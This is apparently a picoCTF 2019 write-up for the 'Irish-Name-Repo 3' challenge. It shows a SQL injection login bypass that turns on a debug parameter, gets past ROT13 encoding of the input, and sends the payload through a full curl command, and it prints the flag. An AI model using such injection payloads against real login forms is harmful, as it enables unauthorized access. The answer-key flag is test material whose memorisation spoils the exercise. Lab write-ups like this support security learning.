# Irish-Name-Repo 3 - 400 points
## Description

There is a secure website running at `https://2019shell1.picoctf.com/problem/4161/` ([link](https://2019shell1.picoctf.com/problem/4161/)) or http://2019shell1.picoctf.com:4161. Try to see if you can login as admin!

## Flag

```
picoCTF{3v3n_m0r3_SQL_d490b67d}
```

## Solution

The last challenge was SQL injection so it was safe to assume that this one would be too.

The first thing I did was try another simple payload like `' OR 1=1--`. Unfortunately, it gave an HTTP 500 error.

At that point I realized in the HTTP POST request that it was sending a body parameter `debug` that was set to `0`. With it set to `0`, it would just error and give no output. With it set to `1`, it would output the query.

This is the output with `debug=1` of a simple `' OR 1=1--`:

```
<pre>password: ' OR 1=1--
SQL query: SELECT * FROM admin where password = '' BE 1=1--'
</pre>
```

Whoa, what's happening with the `BE` thing? Looking at the output I could tell that it was rot-13 encoded because `B` obviously corresponds to `O` (and vice-versa). I just changed my payload to `' BE 1=1--` and tried again:

```sh
curl 'https://2019shell1.picoctf.com/problem/4161/login.php' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6  Sicherheits-Erg\xe4nzungsupdate) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://2019shell1.picoctf.com/problem/4161/login.html' -H 'Content-Type: application/x-www-form-urlencoded' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiJz5cIj48aDE-aGk8L2gxPiJ9.5TyqQ5kcsGZB2MeWCkp6wRPvl3TfqQ_Pk83Dcv2kNbA' -H 'Upgrade-Insecure-Requests: 1' --data 'password=%27 BE 1=1--&debug=1'
```

I got this response:

```
<pre>password: ' BE 1=1--
SQL query: SELECT * FROM admin where password = '' OR 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_d490b67d}</p>
```

Okay, that was also very easy. Let's move on.
